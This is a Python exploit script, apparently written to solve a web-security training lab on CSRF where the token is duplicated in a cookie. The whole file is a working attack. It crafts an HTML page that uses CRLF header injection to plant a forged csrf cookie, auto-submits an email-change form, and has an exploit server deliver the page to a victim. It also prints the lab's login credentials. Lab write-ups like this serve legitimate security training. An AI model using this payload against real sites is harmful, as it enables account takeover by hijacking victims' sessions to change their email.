import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def csrf_attack(url, exploit_server):
    # CSRF
    csrf = "fakecsrf"

    # PAYLOAD
    payload = """<html>
    <body>
        <img src="{0}/?search=hacking%0D%0ASet-Cookie%3A%20csrf%3D{1}%3B%20SameSite%3DNone" onerror=document.forms[0].submit()>
        <form action="{0}/my-account/change-email" method="POST">
            <input required type="email" name="email" value="victim@justgothacked">
            <input required type="hidden" name="csrf" value="{1}">
            <button type="submit">Update Email</button>
        </form>
    </body>
</html>""".format(url, csrf)

    # STORE AND DELIVER PAYLOAD
    params = {
        'urlIsHttps' : 'on',
        'responseFile' : '/exploit',
        'responseHead' : 'HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8',
        'responseBody' : payload,
        'formAction' : 'STORE'
    }

    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not store the payload")
        sys.exit(-1)

    # DELIVER PAYLOAD TO VICTIM
    params['formAction'] = 'DELIVER_TO_VICTIM'
    r = requests.post(exploit_server, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not deliver payload to victim")
        sys.exit(-1)

    # CHECK IF EXPLOIT WAS SUCCESSFUL
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Lab solved! Exploit successful!")


def main():
    if len(sys.argv) != 3:
        print("[-] Usage: %s <url1> <url2>" % sys.argv[0])
        print("[-] Example: %s www.vulnerable-website.com www.exploit-server.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    exploit_server = sys.argv[2].strip()

    print("[+] Lab: CSRF where token is duplicated in cookie")
    print("""[+] This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
    To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter""")


    csrf_attack(url, exploit_server)

if __name__ == "__main__":
    main()